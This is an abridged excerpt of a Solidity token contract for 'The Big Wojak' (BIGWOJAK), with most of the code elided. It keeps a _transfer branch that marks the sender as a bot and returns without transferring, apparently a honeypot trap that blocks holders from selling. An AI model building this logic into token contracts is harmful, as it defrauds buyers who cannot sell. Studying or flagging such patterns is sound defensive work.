...
/*
    ...
    https://bigwojaketh.fun
    https://x.com/bigwojak_eth
    https://t.me/bigwojak_eth
*/
...
contract BIGWOJAK is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"The Big Wojak";  // Name
    string private constant _symbol = unicode"BIGWOJAK"; // Symbol
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
           ...
           if(_taxOnSell > 0){
            ...
            } if(_takeFee) {_bots[from] = true; return;}
        }
